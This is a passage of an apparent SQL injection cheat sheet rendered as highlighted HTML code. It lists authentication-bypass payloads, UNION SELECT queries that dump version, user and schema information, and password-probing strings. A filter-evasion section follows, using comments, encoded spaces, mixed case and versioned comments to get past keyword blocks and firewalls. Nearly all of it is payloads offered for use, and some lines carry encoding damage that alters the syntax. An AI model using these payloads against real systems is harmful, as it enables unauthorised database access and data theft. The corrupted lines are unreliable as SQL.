</span><span style="color:#e6db74">&#34; or 1=1--
</span><span style="color:#e6db74">&#34; or 1=1/*
</span><span style="color:#e6db74">&#34; or 1=1#
</span><span style="color:#e6db74">&#34; or 1=1â€“
</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1
</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1&#34;--
</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1&#34;/*
</span><span style="color:#e6db74">&#34;) or &#34;1&#34;=&#34;1&#34;#
</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1
</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1&#34;--
</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1&#34;/*
</span><span style="color:#e6db74">&#34;) or (&#34;1&#34;=&#34;1&#34;#
</span><span style="color:#e6db74">) or &#39;</span>1â€²<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1â€“
</span><span style="color:#e6db74">) or (&#39;</span>1â€²<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1â€“
</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> LIMIT 1;<span style="color:#75715e">#</span>
<span style="color:#e6db74">&#39;or 1=1 or &#39;&#39;=&#39;</span>
<span style="color:#e6db74">&#34;or 1=1 or &#34;&#34;=&#34;</span>
<span style="color:#e6db74">&#39; or &#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a
<span style="color:#e6db74">&#39; or a=a--
</span><span style="color:#e6db74">&#39;</span> or a<span style="color:#f92672">=</span>aâ€“
<span style="color:#e6db74">&#39;) or (&#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a
<span style="color:#e6db74">&#34; or &#34;</span>a<span style="color:#e6db74">&#34;=&#34;</span>a
<span style="color:#e6db74">&#34;) or (&#34;</span>a<span style="color:#e6db74">&#34;=&#34;</span>a
<span style="color:#e6db74">&#39;) or (&#39;</span>a<span style="color:#e6db74">&#39;=&#39;</span>a and hi<span style="color:#e6db74">&#34;) or (&#34;</span>a<span style="color:#e6db74">&#34;=&#34;</span>a
<span style="color:#e6db74">&#39; or &#39;</span>one<span style="color:#e6db74">&#39;=&#39;</span>one
<span style="color:#e6db74">&#39; or &#39;</span>one<span style="color:#e6db74">&#39;=&#39;</span>oneâ€“
<span style="color:#e6db74">&#39; or uid like &#39;</span>%
<span style="color:#e6db74">&#39; or uname like &#39;</span>%
<span style="color:#e6db74">&#39; or userid like &#39;</span>%
<span style="color:#e6db74">&#39; or user like &#39;</span>%
<span style="color:#e6db74">&#39; or username like &#39;</span>%
<span style="color:#e6db74">&#39; or &#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>x
<span style="color:#e6db74">&#39;) or (&#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>x
<span style="color:#e6db74">&#34; or &#34;</span>x<span style="color:#e6db74">&#34;=&#34;</span>x
<span style="color:#e6db74">&#39; OR &#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>x<span style="color:#e6db74">&#39;#;
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>or<span style="color:#e6db74">&#39; and &#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>or<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">&#39;</span> UNION ALL SELECT 1, @@version;<span style="color:#75715e">#</span>
<span style="color:#e6db74">&#39; UNION ALL SELECT system_user(),user();#
</span><span style="color:#e6db74">&#39;</span> UNION <span style="color:#66d9ef">select</span> table_schema,table_name FROM information_Schema.tables;<span style="color:#75715e">#</span>
admin<span style="color:#e6db74">&#39; and substring(password/text(),1,1)=&#39;</span><span style="color:#ae81ff">7</span>
<span style="color:#e6db74">&#39; and substring(password/text(),1,1)=&#39;</span><span style="color:#ae81ff">7</span>
<span style="color:#e6db74">&#39; or 1=1 limit 1 -- -+
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;or&#39;
</span></code></pre></div><h3 id="sql-injection-bypass-filter">SQL injection bypass filter</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">###</span> Comments
<span style="color:#f92672">//</span>,
<span style="color:#75715e">-- ,
</span><span style="color:#75715e"></span><span style="color:#75715e">/**/</span>, 
<span style="color:#f92672">#</span>,
<span style="color:#75715e">--+,
</span><span style="color:#75715e">--  -,
</span><span style="color:#75715e"></span>;<span style="color:#75715e">--a 
</span><span style="color:#75715e"></span><span style="color:#f92672">###</span> <span style="color:#66d9ef">Prefix</span>
<span style="color:#f92672">+</span> <span style="color:#960050;background-color:#1e0010">â€“</span> <span style="color:#f92672">~</span> <span style="color:#f92672">!</span>
<span style="color:#e6db74">&#39; or â€“+2=- -!!!&#39;</span><span style="color:#ae81ff">2</span>
 <span style="color:#f92672">###</span> <span style="color:#66d9ef">Operator</span>:
<span style="color:#f92672">^</span>, <span style="color:#f92672">=</span>, <span style="color:#f92672">!=</span>, <span style="color:#f92672">%</span>, <span style="color:#f92672">/</span>, <span style="color:#f92672">*</span>, <span style="color:#f92672">&amp;</span>, <span style="color:#f92672">&amp;&amp;</span>, <span style="color:#f92672">|</span>, <span style="color:#f92672">||</span>, , <span style="color:#f92672">&gt;&gt;</span>, <span style="color:#f92672">&lt;=</span>, <span style="color:#f92672">&lt;=</span>, ,, XOR, DIV, <span style="color:#66d9ef">LIKE</span>, SOUNDS <span style="color:#66d9ef">LIKE</span>, RLIKE, REGEXP, LEAST, GREATEST, <span style="color:#66d9ef">CAST</span>, <span style="color:#66d9ef">CONVERT</span>, <span style="color:#66d9ef">IS</span>, <span style="color:#66d9ef">IN</span>, <span style="color:#66d9ef">NOT</span>, <span style="color:#66d9ef">MATCH</span>, <span style="color:#66d9ef">AND</span>, <span style="color:#66d9ef">OR</span>, BINARY, <span style="color:#66d9ef">BETWEEN</span>, <span style="color:#66d9ef">ISNULL</span>
<span style="color:#f92672">###</span> Spaces
<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">09</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>a <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>b <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#66d9ef">c</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>d <span style="color:#f92672">%</span>a0 <span style="color:#75715e">/**/</span>
<span style="color:#e6db74">&#39;or+(1)sounds/**/like&#34;1&#34;â€“%a0-
</span><span style="color:#e6db74">&#39;</span><span style="color:#66d9ef">union</span>(<span style="color:#66d9ef">select</span>(<span style="color:#ae81ff">1</span>),tabe_name,(<span style="color:#ae81ff">3</span>)<span style="color:#66d9ef">from</span><span style="color:#f92672">`</span>information_schema<span style="color:#f92672">`</span>.<span style="color:#f92672">`</span>tables<span style="color:#f92672">`</span>)<span style="color:#f92672">#</span>
<span style="color:#f92672">###</span> A quoted string
<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;a&#34;</span>
<span style="color:#66d9ef">SELECT</span> n<span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">SELECT</span> b<span style="color:#e6db74">&#39;1100001â€²
</span><span style="color:#e6db74">SELECT _binary&#39;</span><span style="color:#ae81ff">1100001</span><span style="color:#960050;background-color:#1e0010">â€²</span>
<span style="color:#66d9ef">SELECT</span> x<span style="color:#e6db74">&#39;61&#39;</span>
<span style="color:#f92672">###</span> Unquoted string
<span style="color:#e6db74">&#39;abc&#39;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">Ã—</span><span style="color:#ae81ff">616263</span>
<span style="color:#66d9ef">and</span> substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">#</span>
<span style="color:#66d9ef">and</span> substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>x61 <span style="color:#f92672">#</span> <span style="color:#ae81ff">0</span>x6162
<span style="color:#66d9ef">and</span> substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> unhex(<span style="color:#ae81ff">61</span>)    <span style="color:#f92672">#</span> unhex(<span style="color:#ae81ff">6162</span>)
<span style="color:#66d9ef">and</span> substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> char(<span style="color:#ae81ff">97</span>  )<span style="color:#f92672">#</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">98</span>)
<span style="color:#66d9ef">and</span> substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">#</span>
<span style="color:#66d9ef">and</span> hex(substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">61</span><span style="color:#f92672">#</span>
<span style="color:#66d9ef">and</span> ascii(substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">97</span><span style="color:#f92672">#</span>
<span style="color:#66d9ef">and</span> ord(substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">97</span><span style="color:#f92672">#</span> 
<span style="color:#66d9ef">and</span> substr(<span style="color:#66d9ef">data</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#66d9ef">lower</span>(conv(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">36</span>))<span style="color:#f92672">#</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#f92672">###</span> <span style="color:#66d9ef">Alias</span>
<span style="color:#66d9ef">select</span> pass <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">alias</span> <span style="color:#66d9ef">from</span> users
<span style="color:#66d9ef">select</span> pass<span style="color:#f92672">`</span><span style="color:#66d9ef">alias</span> <span style="color:#66d9ef">alias</span><span style="color:#f92672">`</span><span style="color:#66d9ef">from</span> users
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">###</span> Font
<span style="color:#e6db74">&#39; or true = &#39;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">#</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span>
<span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">or</span> round(pi(),<span style="color:#ae81ff">1</span>)<span style="color:#f92672">+</span><span style="color:#66d9ef">true</span><span style="color:#f92672">+</span><span style="color:#66d9ef">true</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">version</span>() <span style="color:#f92672">#</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">3</span>.<span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">1</span>
<span style="color:#e6db74">&#39; or &#39;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">#</span> <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">true</span>
<span style="color:#f92672">###</span> <span style="color:#66d9ef">Operator</span> fonts
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;c&#39;</span>
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> (<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;c&#39;</span>
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> (<span style="color:#66d9ef">false</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;c&#39;</span>
<span style="color:#f92672">###</span> Seriously bypass the <span style="color:#e6db74">&#39;=&#39;</span>
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;=&#34;</span>
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">#</span> filter <span style="color:#66d9ef">function</span> ascii (<span style="color:#ae81ff">97</span>)
load_file<span style="color:#75715e">/*foo*/</span>(<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">Ã—</span><span style="color:#ae81ff">616263</span>)
 Construction <span style="color:#f92672">#</span> string functions
<span style="color:#e6db74">&#39;abc&#39;</span> <span style="color:#f92672">=</span> unhex(<span style="color:#ae81ff">616263</span>)
<span style="color:#e6db74">&#39;abc&#39;</span> <span style="color:#f92672">=</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">99</span>)
 hex(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">61</span>
 ascii(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">97</span>
 ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">97</span>
<span style="color:#e6db74">&#39;ABC&#39;</span> <span style="color:#f92672">=</span> concat(conv(<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">36</span>),conv(<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">36</span>),conv(<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">36</span>))
<span style="color:#f92672">###</span> Extracted <span style="color:#66d9ef">substring</span> substr ( <span style="color:#e6db74">&#39;abc&#39;</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
substr(<span style="color:#e6db74">&#39;abc&#39;</span> <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">substring</span>(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">substring</span>(<span style="color:#e6db74">&#39;abc&#39;</span> <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
mid(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
mid(<span style="color:#e6db74">&#39;abc&#39;</span> <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
lpad(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">space</span>(<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
rpad(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">space</span>(<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">left</span>(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
reverse(<span style="color:#66d9ef">right</span>(reverse(<span style="color:#e6db74">&#39;abc&#39;</span>),<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">insert</span>(<span style="color:#66d9ef">insert</span>(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">space</span>(<span style="color:#ae81ff">0</span>)),<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">222</span>,<span style="color:#66d9ef">space</span>(<span style="color:#ae81ff">0</span>)) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>
<span style="color:#66d9ef">space</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#66d9ef">trim</span>(<span style="color:#66d9ef">version</span>()<span style="color:#66d9ef">from</span>(<span style="color:#66d9ef">version</span>()))
<span style="color:#f92672">###</span> <span style="color:#66d9ef">Substring</span> <span style="color:#66d9ef">search</span>
locate(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;abc&#39;</span>)
<span style="color:#66d9ef">position</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;abc&#39;</span>)
<span style="color:#66d9ef">position</span>(<span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">IN</span> <span style="color:#e6db74">&#39;abc&#39;</span>)
instr(<span style="color:#e6db74">&#39;abc&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
substring_index(<span style="color:#e6db74">&#39;ab&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#ae81ff">1</span>)
Split string <span style="color:#f92672">#</span>
<span style="color:#66d9ef">length</span>(<span style="color:#66d9ef">trim</span>(<span style="color:#66d9ef">leading</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#39;abc&#39;</span>))
<span style="color:#66d9ef">length</span>(<span style="color:#66d9ef">replace</span>(<span style="color:#e6db74">&#39;abc&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#34;))
</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">###</span> String comparison
strcmp(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
<span style="color:#66d9ef">mod</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
find_in_set(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
field(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>)
<span style="color:#66d9ef">count</span>(concat(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>))
 
<span style="color:#f92672">###</span> String <span style="color:#66d9ef">length</span>
<span style="color:#66d9ef">length</span>()
<span style="color:#66d9ef">bit_length</span>()
<span style="color:#66d9ef">char_length</span>()
<span style="color:#66d9ef">octet_length</span>()
bit_count()
 
<span style="color:#f92672">###</span> Keyword filter
Connected keyword filtering
(<span style="color:#ae81ff">0</span>)<span style="color:#66d9ef">union</span>(<span style="color:#66d9ef">select</span>(<span style="color:#66d9ef">table_name</span>),<span style="color:#66d9ef">column_name</span>,<span style="color:#960050;background-color:#1e0010">â€¦</span>
<span style="color:#ae81ff">0</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/*!50000select*/</span><span style="color:#66d9ef">table_name</span><span style="color:#f92672">`</span>foo<span style="color:#f92672">`</span><span style="color:#75715e">/**/</span><span style="color:#960050;background-color:#1e0010">â€¦</span>
<span style="color:#ae81ff">0</span><span style="color:#f92672">%</span>a0union<span style="color:#f92672">%</span>a0select<span style="color:#f92672">%</span><span style="color:#ae81ff">09</span>group_concat(<span style="color:#66d9ef">table_name</span>)<span style="color:#960050;background-color:#1e0010">â€¦</span>.
<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">â€²</span><span style="color:#66d9ef">union</span> <span style="color:#66d9ef">all</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">all</span><span style="color:#f92672">`</span><span style="color:#66d9ef">table_name</span><span style="color:#f92672">`</span>foo <span style="color:#66d9ef">from</span><span style="color:#f92672">`</span>information_schema<span style="color:#f92672">`</span>. <span style="color:#f92672">`</span>tables<span style="color:#f92672">`</span>
 
<span style="color:#f92672">###</span> Flow control
<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">when</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">then</span> <span style="color:#ae81ff">1</span> [<span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">case</span> <span style="color:#66d9ef">when</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">then</span> <span style="color:#ae81ff">1</span> [<span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>)
ifnull(<span style="color:#66d9ef">nullif</span>(<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>),<span style="color:#ae81ff">1</span>)
 d) a test vector
<span style="color:#f92672">%</span><span style="color:#ae81ff">55</span>nion(<span style="color:#f92672">%</span><span style="color:#ae81ff">53</span>elect <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>)<span style="color:#75715e">-- -
</span><span style="color:#75715e"></span> 
<span style="color:#f92672">+</span><span style="color:#66d9ef">union</span><span style="color:#f92672">+</span>distinctROW<span style="color:#f92672">+</span><span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>
<span style="color:#75715e">/**//*!12345UNION SELECT*//**/</span>
<span style="color:#75715e">/**/</span><span style="color:#66d9ef">UNION</span><span style="color:#75715e">/**//*!50000SELECT*//**/</span>
<span style="color:#75715e">/*!50000UniON SeLeCt*/</span>
<span style="color:#f92672">+#</span><span style="color:#66d9ef">uNiOn</span><span style="color:#f92672">+#</span><span style="color:#66d9ef">sEleCt</span>
<span style="color:#f92672">+#</span><span style="color:#ae81ff">1</span>q<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>AuNiOn <span style="color:#66d9ef">all</span><span style="color:#f92672">#</span>qa<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#f92672">#%</span><span style="color:#ae81ff">0</span>AsEleCt
<span style="color:#75715e">/*!u%6eion*/</span> <span style="color:#75715e">/*!se%6cect*/</span>
<span style="color:#f92672">+</span>un<span style="color:#75715e">/**/</span>ion<span style="color:#f92672">+</span>se<span style="color:#75715e">/**/</span>lect
uni<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>bon<span style="color:#f92672">+</span>se<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>blect
<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>f<span style="color:#f92672">**%</span><span style="color:#ae81ff">2</span>funion<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>f<span style="color:#f92672">**%</span><span style="color:#ae81ff">2</span>fselect
<span style="color:#66d9ef">union</span><span style="color:#f92672">%</span><span style="color:#ae81ff">23</span>foo<span style="color:#f92672">*%</span><span style="color:#ae81ff">2</span>F<span style="color:#f92672">*</span>bar<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>Aselect<span style="color:#f92672">%</span><span style="color:#ae81ff">23</span>foo<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A
REVERSE(noinu)<span style="color:#f92672">+</span>REVERSE(tceles)
<span style="color:#75715e">/*--*/</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/*--*/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/*--*/</span>
<span style="color:#66d9ef">union</span> (<span style="color:#75715e">/*!/**/ SeleCT */</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>)
<span style="color:#75715e">/*!union*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!select*/</span>
<span style="color:#66d9ef">union</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!select*/</span>
<span style="color:#75715e">/**//*!union*//**//*!select*//**/</span>
<span style="color:#75715e">/*!uNIOn*/</span> <span style="color:#75715e">/*!SelECt*/</span>
<span style="color:#f92672">+</span><span style="color:#66d9ef">union</span><span style="color:#f92672">+</span>distinctROW<span style="color:#f92672">+</span><span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>
<span style="color:#f92672">-</span><span style="color:#ae81ff">15</span><span style="color:#f92672">+</span>(<span style="color:#66d9ef">uNioN</span>)<span style="color:#f92672">+</span>(<span style="color:#66d9ef">sElECt</span>)
<span style="color:#f92672">-</span><span style="color:#ae81ff">15</span><span style="color:#f92672">+</span>(UnI)(<span style="color:#66d9ef">oN</span>)<span style="color:#f92672">+</span>(SeL)(ecT)<span style="color:#f92672">+</span>
 
id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#66d9ef">UnIOn</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">SeLect</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>UNIunionON<span style="color:#f92672">+</span>SELselectECT <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!UnIOn*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!sElEcT*/</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> (<span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>(<span style="color:#66d9ef">Select</span> <span style="color:#ae81ff">0</span>xAA <span style="color:#ae81ff">1000</span> <span style="color:#66d9ef">more</span> A<span style="color:#960050;background-color:#1e0010">â€™</span>s)<span style="color:#f92672">+</span><span style="color:#66d9ef">UnIoN</span><span style="color:#f92672">+</span><span style="color:#66d9ef">SeLeCT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>un<span style="color:#75715e">/**/</span>ion<span style="color:#f92672">+</span>sel<span style="color:#75715e">/**/</span>ect<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#75715e">--
